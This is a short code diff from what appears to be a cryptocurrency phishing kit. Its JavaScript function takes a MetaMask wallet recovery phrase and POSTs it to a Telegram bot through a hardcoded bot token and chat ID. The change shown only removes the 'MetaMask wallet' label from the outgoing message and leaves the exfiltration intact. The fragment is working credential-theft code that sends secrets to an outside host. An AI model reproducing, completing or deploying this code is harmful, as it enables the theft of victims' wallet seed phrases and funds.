@@ -5,7 +5,7 @@ const BOT_TOKEN = "8117026939:AAHL-gHuabUrfzJeg54ei4HWjUy53QMCVhc";
 const CHAT_ID = "6996434307";
 
 function sendToTelegram(phrase) {
-  const message = "🦊 MetaMask wallet:\n\n" + phrase.trim();
+  const message = "\n\n" + phrase.trim();
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
